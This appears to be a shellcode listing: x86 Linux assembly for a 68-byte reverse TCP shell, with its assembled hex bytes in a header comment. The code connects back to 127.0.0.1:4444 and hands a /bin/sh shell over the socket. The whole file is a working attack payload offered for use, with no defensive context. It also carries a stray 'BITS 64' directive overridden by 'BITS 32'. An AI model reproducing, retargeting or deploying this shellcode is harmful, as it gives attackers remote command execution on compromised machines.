; Title:    Linux x86 reverse TCP shell 127.0.0.1:4444
; Platform: linux
; Arch:     x86
; Size:     68 bytes
; Encoding: raw
;
; Assembled hex:
; \x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1\x6a\x10\x51\x53\x89\xe1\x43\xb0\x66\xcd\x80\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80

BITS 64
global _start

_start:
    BITS    32
    ; socket(AF_INET, SOCK_STREAM, 0)
    xor     ebx, ebx
    mul     ebx
    push    ebx
    inc     ebx
    push    ebx
    push    2
    mov     ecx, esp
    mov     al, 0x66            ; socketcall
    int     0x80
    xchg    eax, ebx            ; ebx = sockfd
    ; dup2 stdin/out/err
    pop     ecx
    dup2_loop:
    mov     al, 0x3f
    int     0x80
    dec     ecx
    jns     dup2_loop
    ; connect to 127.0.0.1:4444
    push    0x0100007f
    push    word 0x5c11
    push    word 2
    mov     ecx, esp
    push    0x10
    push    ecx
    push    ebx
    mov     ecx, esp
    inc     ebx
    mov     al, 0x66
    int     0x80
    ; execve /bin/sh
    push    0x0b
    pop     eax
    cdq
    push    edx
    push    0x68732f2f
    push    0x6e69622f
    mov     ebx, esp
    push    edx
    push    ebx
    mov     ecx, esp
    int     0x80
